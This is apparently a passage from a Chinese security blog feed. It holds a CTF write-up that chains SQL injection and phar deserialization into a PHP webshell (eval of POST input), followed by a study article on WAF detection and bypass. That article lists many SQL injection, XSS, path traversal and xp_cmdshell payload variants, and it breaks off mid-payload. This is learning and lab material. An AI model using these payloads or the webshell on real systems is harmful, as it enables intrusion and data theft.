class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpwd</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>&#125;<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;set name <span class="hljs-subst">$charName</span>&quot;</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select email from user where email = &#x27;<span class="hljs-subst">$email</span>&#x27; and username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;email&#x27;</span>])&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;RESET&#x27;</span>]=<span class="hljs-literal">true</span>;<br><span class="hljs-variable language_">$this</span>-&gt;email = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&quot;你好！ 已经将重置密码链接发送至邮箱&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;email;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;RESET&#x27;</span>]=<span class="hljs-literal">false</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&quot;邮箱不存在&quot;</span>;<br>&#125;<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dispatcher</span>(<span class="hljs-string">&quot;../index.php&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以知道我们可以在传email参数时只需要符合邮箱规则就可以随便注入了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#x27;/**/union/**/select/**/password/**/from/**/user#@qq.com<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506144.png" alt="image-20240427102704985"></p><p><img src="http://cdn.clown2024.cn/202407151440720.png" alt="image-20240427102633626"></p><p>一开始尝试用where想着指定username但是就会弹出邮箱不存在，他这里的用户名是ctfshow我一开始还以为是admin，不过知道了之后带上where还是不行，估计是不符合他函数的邮箱格式，返回NULL了直接。</p><p><strong>文件上传</strong></p><p><img src="http://cdn.clown2024.cn/202407151506145.png" alt="image-20240427103330840"></p><p>登陆进去之后就是一个经典的后台文件上传，先去看看源码有没有文件上传漏洞</p><p>嘶发现源码看不了，传了一个图片文件上去看了一下</p><p><img src="http://cdn.clown2024.cn/202407151506146.png" alt="image-20240427103952374"></p><p>去看了一下doView()函数，他的图片应该是放在userfiles的目录下面</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doView</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSession</span>();<br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))&#123;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: image/jpeg&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;../ckfinder/userfiles/&quot;</span>.<span class="hljs-variable">$file</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再去抓了个包看了一下，具体的路径如下图</p><p><img src="http://cdn.clown2024.cn/202407151506147.png" alt="image-20240427110639504"></p><p>尝试能不能上传.php文件，抓了个包但是发现校验在前端完成，后端做的就是刷新一下这个页面</p><p><img src="http://cdn.clown2024.cn/202407151506148.png" alt="image-20240427110855204"></p><p><img src="http://cdn.clown2024.cn/202407151506149.png" alt="image-20240427110939934"></p><p>看来直接传应该是不行了</p><p><strong>sendResetMail</strong></p><p>再来看一下这个函数</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResetMail</span>(<span class="hljs-params"><span class="hljs-variable">$mail</span></span>)</span>&#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;你好，下面是你的重置密码链接，请复制到浏览器地址栏打开.&quot;</span>;<br><span class="hljs-variable">$content</span>.= <span class="hljs-string">&quot;http://xxx.com/?token=xxxx&amp;email=<span class="hljs-subst">$mail</span>&quot;</span>;<br><br><span class="hljs-comment">//功能暂未实现，先保留邮件，以后发送</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;../mail_cache/cache.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php exit(&#x27;<span class="hljs-subst">$content</span>&#x27;);?&gt;&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里有一个file_put_contents()函数，看看能不能写码进去，看一下哪里引用了这个函数。</p><p><img src="http://cdn.clown2024.cn/202407151440726.png" alt="image-20240427104655565"></p><p>先是clear这里引用了一下，再去看哪里引用了clear</p><p><img src="http://cdn.clown2024.cn/202407151506150.png" alt="image-20240427105001364"></p><p>可以看到__wakeup()魔术方法引用了clear，但是再往上找就没有了，想要触发的话就需要反序列化，但是这里也没有反序列化的入口</p><p>这时候就可以想到phar了，毕竟我们还有个文件上传的功能，那要怎么触发phar呢，上面看过的doView函数就可以</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doView</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSession</span>();<br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))&#123;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: image/jpeg&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;../ckfinder/userfiles/&quot;</span>.<span class="hljs-variable">$file</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>幸运的是这里的file参数我们是可控的</p><p>那利用条件达成，现在就是生成一个phar文件，后缀改成png或者jpg即可，毕竟phar文件是不以后缀名来辨认了,注意这里还要写一个真的图片文件进去，一开始没写改了后缀还是不行。。。</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//phar.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">action</span></span>&#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-variable">$email</span>=<span class="hljs-string">&quot;&#x27;.eval(\$_POST[1]));//&quot;</span>; <span class="hljs-comment">//这样写是为了闭合闭合前面的exit然后注释后面的语句</span><br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;web859.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;web859.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;test1.png&#x27;</span>).<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub标志,写一个真的jpg文件进去保证等会能够上传成功</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">action</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$o</span>));<span class="hljs-comment">//设置自定义的meta-data</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;hello~&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">php -d phar.readonly=0 phar.php<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506151.png" alt="image-20240427115006368"></p><p>上传成功，现在我们直接去用phar伪协议读取这个图片就可以把我们的码写到<code>../mail_cache/cache.php</code>这个地方了</p><p>抓包找到路径</p><p><img src="http://cdn.clown2024.cn/202407151506152.png" alt="image-20240427115434070"></p><p>然后去api&#x2F;index.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">file=phar:///var/www/html/ckfinder/userfiles/web859.png<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506153.png" alt="image-20240427115556308"></p><p>然后直接蚁剑连接<a href="http://127.0.0.1:8081/mail_cache/cache.php%E5%8D%B3%E5%8F%AF">http://127.0.0.1:8081/mail_cache/cache.php即可</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>waf绕过学习</title>
      <link href="/2024/04/22/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/22/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>来学习一下waf的相关知识，参考文章：<a href="https://www.kancloud.cn/noahs/src_hacker/2395057">https://www.kancloud.cn/noahs/src_hacker/2395057</a></p><p><a href="https://xz.aliyun.com/t/12684?time__1311=mqmhDvqIOaGNDQtiQGkIfdAI3GKA9xhD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/12684?time__1311=mqmhDvqIOaGNDQtiQGkIfdAI3GKA9xhD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><h1><span id="waf的分类">WAF的分类</span></h1><ol><li>软件<br>装在主机侧(服务器)上的软件,如安全狗、D盾、云锁等。</li><li>硬件<br>装在企业链路上的,所有流量都要进过的硬件，一般由厂商安装，其串联在内网交换机，防护范围大。</li><li>云waf<br>通过DNS解析到云WAF，访问网站的流量要经过指定的DNS服务器解析，然后进入WAF节点进行过滤，最后访问原始服务器，如阿里云、腾讯云之类。</li></ol><h1><span id="waf工作原理">WAF工作原理</span></h1><p>处理流程大致分为四部分：预处理、规则检测、处理模块、日志记录</p><p><strong>预处理</strong></p><p>接收到数据请求流量时，先判断该请求是否白名单，如果在白名单内直接交给服务器响应，否则解析后进入到规则检测。</p><p><strong>规则检测</strong></p><p>数据解析后就会进入到WAF的检测体系中进行规则匹配，检查是否符合要求。</p><p><strong>处理模块</strong></p><p>针对检测结果，符合要求的就交给后端响应，不符合的则会执行相关的防御动作，比如：阻断、记录、告警等。</p><p>不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。</p><p>这篇文章有常见的WAF产品的界面：<a href="https://cloud.tencent.com/developer/article/1872310">https://cloud.tencent.com/developer/article/1872310</a></p><p><strong>日志记录</strong></p><p>即记录下拦截处理的日志。</p><h1><span id="waf的判断">WAF的判断</span></h1><h2><span id="sqlmap">sqlmap</span></h2><p>网站有waf的话，sqlmap在进行扫描遇到waf的时候也会有提示。</p><h2><span id="wafw00f">Wafw00f</span></h2><p>这是kali下自带的一个waf检测工具,比如这里探测一下baidu</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wafw00f www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445867.png" alt="image-20240422134538639"></p><h2><span id="手动测试">手动测试</span></h2><p>我们可以通过分析http请求响应报文的X-Powered-By字段，比如他可能显示anyu.qianxin.com，那么用的就是奇安信的WAF。</p><h2><span id="恶意字符或者敏感页面测试">恶意字符或者敏感页面测试</span></h2><p>比如一些sql注入的语句或者一些命令执行字符，或者访问一些敏感页面，看看是否会出现防火墙的拦截页面。</p><h1><span id="waf的绕过">WAF的绕过</span></h1><h2><span id="检测规则绕过">检测规则绕过</span></h2><h3><span id="修改请求方式绕过">修改请求方式绕过</span></h3><p>最典型的修改请求方式绕过，很多的asp，aspx网站都存在这个问题，有时候WAF对GET进行了过滤，但是Cookie甚至POST参数却没有检测。</p><h3><span id="复参数绕过">复参数绕过</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#例如一个请求是这样的<br>GET /pen/news.php?id=1 union select user,password from mysql.user<br>#可以修改为<br>GET pen/news.php?id=1&amp;id=union&amp;id=select&amp;id=user,password&amp;id=from%20mysql.user<br></code></pre></td></tr></table></figure><h3><span id="大小写绕过">大小写绕过</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=1 UnIon SelECt 1<br></code></pre></td></tr></table></figure><h3><span id="url编码绕过">URL编码绕过</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">被WAF阻止：UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)绕过的技术：UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29<br></code></pre></td></tr></table></figure><h3><span id="unicode技术">Unicode技术</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">../../etc/shadow混淆：<br>%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow<br></code></pre></td></tr></table></figure><p>该技术可以参考一下p神最新的文章：<a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</a></p><p>这里贴一下unicode转UTF-8的转换表</p><p><img src="http://cdn.clown2024.cn/202407151445868.png" alt="image-20240422160514001"></p><p>总结下大概就是正常unicode编码的.应该是\u2e,是无法转换成两字节UTF-8编码的，但是我们可以给他前面补0，然后分成5位和6位两组，00000、101110，然后分别给这两组加前缀110、10，这样对应就是\xC0\xAE。</p><p>但是这并不是一个合法的UTF-8字符，有些语言在转换时就会出错，比如python，但是java就不会，java存在这个解析缺陷，所以可以造成路径穿越。</p><p>其他的字符也同理，这里贴一下各字符的转换</p><p><strong>Unicode的URL编码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">. = %u002e<br>/ = %u2215<br>\ = %u2216<br></code></pre></td></tr></table></figure><p><strong>UTF-8的Unicode编码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">. = %c0%2e, %e0%40%ae, %c0ae<br>/ = %c0%af, %e0%80%af, %c0%2f<br>\ = %c0%5c, %c0%80%5c<br></code></pre></td></tr></table></figure><p>这是p神的ascii转换成Overlong Encoding的UTF-8编码脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_int</span>(<span class="hljs-params">i: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    b1 = ((i &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0b11111</span>) | <span class="hljs-number">0b11000000</span><br>    b2 = (i &amp; <span class="hljs-number">0b111111</span>) | <span class="hljs-number">0b10000000</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([b1, b2])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_str</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    bs = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s.encode():<br>        bs += convert_int(ch)<br><br>    <span class="hljs-keyword">return</span> bs<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(convert_str(<span class="hljs-string">&#x27;.&#x27;</span>)) <span class="hljs-comment"># b&#x27;\xc0\xae&#x27;</span><br>    <span class="hljs-built_in">print</span>(convert_str(<span class="hljs-string">&#x27;org.example.Evil&#x27;</span>)) <span class="hljs-comment"># b&#x27;\xc1\xaf\xc1\xb2\xc1\xa7\xc0\xae\xc1\xa5\xc1\xb8\xc1\xa1\xc1\xad\xc1\xb0\xc1\xac\xc1\xa5\xc0\xae\xc1\x85\xc1\xb6\xc1\xa9\xc1\xac&#x27;</span><br></code></pre></td></tr></table></figure><h3><span id="特殊字符替换">特殊字符替换</span></h3><p>用一些特殊字符替换空格，比如mysql中的%0a是换行，可以用来代替空格，还有内联注释&#x2F;**&#x2F;替换空格等等</p><p>还有%23为#号用来注释等等</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#原注入语句<br>xxx/sql.php/id=1 union select 1,user(),3,4,5<br>#混用后<br>xxx/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5<br>xxx/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2<br></code></pre></td></tr></table></figure><h3><span id="特殊字符拼接">特殊字符拼接</span></h3><p>把特殊字符拼接起来绕过WAF的检测，比如在mssql中，函数里面可以用+来拼接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#如：<br>GET /pen/news.php?id=1;exec(master…xp_cmdshell ‘net user’)<br>#可以改为：<br>GET /pen/news.php?id=1;exec(‘maste’+‘r…xp’+’_cmdshell’+’“net user”’)<br></code></pre></td></tr></table></figure><h3><span id="注释包含关键词">注释包含关键词</span></h3><p>在mysql中，可以利用<code>/!/</code>包含关键词进行绕过，在mysql中这个不是注释，而是取消注释的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /pen/news.php?id=1 union select user,password from mysql.user<br>#可以改为: <br>GET /pen/news.php?id=1 /!union/ /!select/ user,password /!from/ mysql.user<br></code></pre></td></tr></table></figure><h3><span id="关键词替换">关键词替换</span></h3><p>有些waf会把关键词替换为’’，这样就可以双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xxx/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4….<br>#此方法适用于一些会把union select替换掉的WAF，经过WAF过滤后就会变成<br>union select 1,2,3,4....<br></code></pre></td></tr></table></figure><h3><span id="编码与注释结合">编码与注释结合</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xxx/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4…<br>xxx/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5<br>xxx/sqli/Less-1/?id=1&#x27; and /*!1=1*/ %23 (WAF不拦截)<br><br>&lt;script&gt;confirm()&lt;/script&gt;<br>绕过的技术：&lt;!--&gt;&lt;script&gt;confirm/**/()/**/&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>还可以用sqlmap的脚本实现自动注入</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sqlmap.py -u &quot;URL&quot; --tamper=&quot;versionedmorekeywords.py&quot; --dealy=1<br></code></pre></td></tr></table></figure><h3><span id="语句替换">语句替换</span></h3><p>就是找一些其他具有同等效果的命令或者变量进行替换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@@version 代替品 version()<br>concat() 代替品 concat_ws()<br>group_concat() 代替品 concat_ws()<br>= 代替品 like<br><br>#还有就是把or &#x27;1=1&#x27; 改成更复杂的如-1=-1**<br></code></pre></td></tr></table></figure><h3><span id="宽字节绕过">宽字节绕过</span></h3><p>这是gbk和utf-8导致的编码转换问题，gbk是用固定的两个字节表示一个汉字，编码范围为：第一个字节是（129-254），第二个字节（64-254），当为gbk编码时遇到连续的两个符合字节范围的字节，就会自动解析为一个汉字</p><p>比如：php的addslashes函数为了防止sql注入会对传入的参数进行转义，比如**’–&gt;\‘**，让单引号失去作用</p><p>这时候就可以用宽字节绕过，\‘的编码为%5C%27，我们只要输入%df%27，%df就会和%5C组合成两个符合gbk编码范围的字节，就会解析成为一个汉字，因为%5c的编码位数为92，%df的编码位数为223，%df%5c符合gbk取值范围，这样\就会失去他的转义作用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">union = uю%69яю这里把i不用宽字节 直接url编码 其他的字符都用对应的宽字节<br>select = こхlх%уt //t不编码 其他的都宽字节 中间插上%<br>from = цR%яэ //宽字节+%<br>空格=%20=%ва //в是2的款字符 а是0的宽字符<br>, = Ь //,号的宽字节<br></code></pre></td></tr></table></figure><h3><span id="00截断绕过">00截断绕过</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=1%00and 1=2 union select 1,2,column_name from information_schema.columns<br></code></pre></td></tr></table></figure><h3><span id="溢出waf绕过">溢出waf绕过</span></h3><p>就是脏数据绕过，添加一些无用的字符去绕过检测，因为有些waf只检测固定长度的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?id=1+and+sleep(3) <br>绕过payload:<br>?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111<br></code></pre></td></tr></table></figure><h3><span id="协议未覆盖绕过">协议未覆盖绕过</span></h3><p>比如下面是四种Content-Type类型</p><ul><li>Content-Type:multipart&#x2F;form-data;</li><li>Content-Type:application&#x2F;x-www-form-urlencoded</li><li>Content-Type: text&#x2F;xml</li><li>Content-Type: application&#x2F;json</li></ul><p>有些waf只针对了一种进行过滤，而忽略了其他的类型，我们可以替换着去尝试一下绕过。</p><h2><span id="分块传输绕过">分块传输绕过</span></h2><p>参考文章：<a href="https://forum.butian.net/share/1982">https://forum.butian.net/share/1982</a></p><h3><span id="分块传输介绍">分块传输介绍</span></h3><p>分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 就表示整个response将使用分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。</p><p>这是一张传输流程图；</p><p><img src="http://cdn.clown2024.cn/202407151445869.png" alt="image-20240422230718168"></p><h3><span id="安全狗分块传输绕过">安全狗分块传输绕过</span></h3><p>这里使用安全狗和pikachu靶场环境来进行学习</p><p><strong>sql注入</strong></p><p>这里演示一下安全狗bypass sql注入，选用pikachu靶场的第一个数字型注入</p><p><img src="http://cdn.clown2024.cn/202407151445870.png" alt="image-20240423155829763"></p><p>他这里是使用post传参的，这里我们尝试查询</p><p>先查询正常数据</p><p><img src="http://cdn.clown2024.cn/202407151445871.png" alt="image-20240423160031061"></p><p>然后查询一下敏感数据</p><p><img src="http://cdn.clown2024.cn/202407151445872.png" alt="image-20240423160100271"></p><p>挺离谱的安全狗页面都不弹直接给我500.。。。</p><p>一开始以为服务器有问题，再去看了一下是有拦截日志的</p><p><img src="http://cdn.clown2024.cn/202407151445873.png" alt="image-20240423160205769"></p><p>然后我们可以使用burp的一个分块传输插件进行编码</p><p><img src="http://cdn.clown2024.cn/202407151445874.png" alt="image-20240423160247835"></p><p><img src="http://cdn.clown2024.cn/202407151445875.png" alt="image-20240423160317250"></p><p>但是很遗憾他查不出东西我也不知道，我看网上都是用sqli-lab来做演示是可以的，不知道是不是靶场问题，这里懒得再搭一个知道分块传输怎么用就行了（</p><p><strong>文件上传分块绕过</strong></p><p>这里选择第一个client check关卡</p><p>上传图片是正常的</p><p><img src="http://cdn.clown2024.cn/202407151445876.png" alt="image-20240423160746018"></p><blockquote><p>xs不过他安全狗没有检测文件内容似乎</p></blockquote><p>然后改成php就会变成500</p><p><img src="http://cdn.clown2024.cn/202407151445877.png" alt="image-20240423160840426"></p><p><img src="http://cdn.clown2024.cn/202407151445878.png" alt="image-20240423160856459"></p><p>然后使用分块传输</p><p><img src="http://cdn.clown2024.cn/202407151445879.png" alt="image-20240423161111604"></p><p>难绷还是没有成功，安全狗不拦截了感觉是服务器解析的问题，可能服务器不太支持分块传输，反正我看别人的都是可以的（</p><h3><span id="延时分块传输">延时分块传输</span></h3><p>参考文章：<a href="https://blog.csdn.net/weixin_43571641/article/details/123749544">https://blog.csdn.net/weixin_43571641/article/details/123749544</a></p><p>因为现在很多waf也可以识别分块传输，检测步骤一般如下：</p><ol><li>发现数据包是分块传输，启动分块传输线程进行接收</li><li>分块传输线程不断接收客户端传来的分块，直到接收到<code>0\r\n\r\n</code></li><li>将所有分块合并，并检测合并之后的内容</li></ol><p>而延时分块传输就是在这基础之上，在上一块传输完成后sleep一段时间，再发送下一块，目的是在2阶段延长WAF分块传输线程的等待时间，从而消耗WAF性能。</p><p>延时分块传输可以使用<code>chunked-coding-converter</code>插件，这里放一张原理图：</p><p><img src="http://cdn.clown2024.cn/202407151445881.png" alt="img"></p><blockquote><p>注意：块与块之间发送的间隔时间必须要小于后端中间件的post timeout,Tomcat默认是20s,weblogic是30s。</p></blockquote><h2><span id="boundary边界混淆绕过">boundary边界混淆绕过</span></h2><h3><span id="boundary介绍">boundary介绍</span></h3><p>先了解一下boundary边界：</p><p>bounday就是使用multipart&#x2F;form-data传递请求时用于区分传输数据的不同部分，他的请求体会类似这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">POST /submit-form HTTP/1.1<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX2xgCtC5TrfYuPLo<br><br>------WebKitFormBoundaryX2xgCtC5TrfYuPLo<br>Content-Disposition: form-data; name=&quot;text&quot;<br><br>Hello, World!<br>------WebKitFormBoundaryX2xgCtC5TrfYuPLo<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;example.txt&quot;<br>Content-Type: text/plain<br><br>这是文件的内容。<br>------WebKitFormBoundaryX2xgCtC5TrfYuPLo--<br></code></pre></td></tr></table></figure><p>其中的boundary定义的就是分割边界</p><p>总结下来一个典型的 <code>multipart/form-data</code> 请求体包含以下部分：</p><ul><li><strong>边界字符串</strong>：每个数据部分的开始和结束都由边界字符串标识。</li><li><strong>内容描述</strong>：每个部分的开始都有一个 <code>Content-Disposition</code> 头，描述了该部分的字段名、文件名等信息。</li><li><strong>内容类型</strong>：可选的 <code>Content-Type</code> 头，指示了数据的类型，如 <code>text/plain</code> 或 <code>image/jpeg</code>。</li><li><strong>数据本身</strong>：字段值或文件内容。</li></ul><h3><span id="混淆绕过">混淆绕过</span></h3><p>即我们可以对boundary的定义添加一些自定义的boundary来进行绕过</p><p>boundary有这样一些特性：</p><ol><li>boundary的结束标志不一致时可以正常响应，开始标志不一致时则不能正常响应</li><li>当有多个boundary定义时只有第一个起作用</li></ol><p>我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里用pikachu和安全狗测试，也就是上面分块传输的测试地方</p><p>这里多加了一个boundary就成功绕过了</p><p><img src="http://cdn.clown2024.cn/202407151445882.png" alt="image-20240423164150994"></p><p>我们去访问一下看看</p><p><img src="http://cdn.clown2024.cn/202407151445883.png" alt="image-20240423164248964"></p><p>发现已经成功绕过了，但是内容检测异常所以被拦了，我就说怎么不检测内容在这等着我原来。</p><h2><span id="cookiex2fx-forwarded-for注入绕过">Cookie&#x2F;X-Forwarded-For注入绕过</span></h2><p>部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。</p><p>比如这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /index.aspx HTTP/1.1<br>Host: 192.168.61.175<br>Cookie:TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28; id=1+and+1=1;<br>X-Forwarded-For:127.0.0.1&#x27;;WAITFOR 